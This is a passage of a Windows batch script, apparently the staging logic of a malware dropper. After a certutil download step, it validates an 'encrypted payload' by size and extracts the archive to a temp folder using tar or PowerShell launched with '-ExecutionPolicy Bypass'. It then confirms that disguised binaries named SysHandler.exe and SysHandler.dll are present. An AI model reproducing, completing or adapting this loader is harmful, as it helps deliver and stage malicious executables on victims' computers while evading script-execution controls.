  >>"%LOG%" echo [certutil] exit code failure
  goto :eof
)
call :verify_zip
goto :eof

:verify_zip
set "DL_OK=0"
set "ZCHECK=0"
if not exist "%ENC%" goto :eof
for %%A in ("%ENC%") do set "SZ=%%~zA"
if !SZ! LSS %MIN_SIZE% (
  >>"%LOG%" echo [verify] rejected, file too small: !SZ! bytes
  del /f /q "%ENC%" >nul 2>&1
  goto :eof
)
set "ZCHECK=1"
>>"%LOG%" echo [verify] encrypted payload size ok: !SZ! bytes
:vz_done
if "!ZCHECK!"=="1" set "DL_OK=1"
goto :eof

:extract_package
set "EXOK=0"
if exist "%SYS%\tar.exe" (
  "%SYS%\tar.exe" -xf "%ZIP%" -C "%TMPF%" >>"%LOG%" 2>&1
  if errorlevel 1 (
    >>"%LOG%" echo [extract] tar failed
  ) else (
    set "EXOK=1"
    >>"%LOG%" echo [extract] tar ok
    goto :ex_check
  )
)
if exist "%PS1%" (
  "%PS1%" -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -LiteralPath '%ZIP%' -DestinationPath '%TMPF%' -Force" >>"%LOG%" 2>&1
  if errorlevel 1 (
    >>"%LOG%" echo [extract] Expand-Archive failed
  ) else (
    set "EXOK=1"
    >>"%LOG%" echo [extract] Expand-Archive ok
  )
) else (
  >>"%LOG%" echo [extract] powershell not available
)
:ex_check
if "!EXOK!"=="0" goto :eof
if not exist "%TMPF%\SysHandler.exe" (
  >>"%LOG%" echo [extract] SysHandler.exe missing after extraction
  set "EXOK=0"
)
if not exist "%TMPF%\SysHandler.dll" (
  >>"%LOG%" echo [extract] SysHandler.dll missing after extraction
  set "EXOK=0"
)
goto :eof
